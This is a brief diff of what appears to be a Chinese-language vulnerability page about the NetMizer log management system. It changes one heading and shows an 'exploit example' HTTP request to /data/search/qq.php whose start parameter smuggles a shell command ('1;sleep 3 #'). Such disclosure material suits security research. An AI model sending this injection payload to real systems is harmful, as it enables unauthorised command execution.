@@ -80,7 +80,7 @@ NetMizer日志管理系统是一款专为网络流量管理和优化设计的日
 
 [漏洞](https://mrxn.net/tag/%E6%BC%8F%E6%B4%9E)利用示例
 
-漏洞扫描服务
+软件
 
 ```
 GET /data/search/qq.php?action=file&start=1;sleep+3+%23+ HTTP/1.1
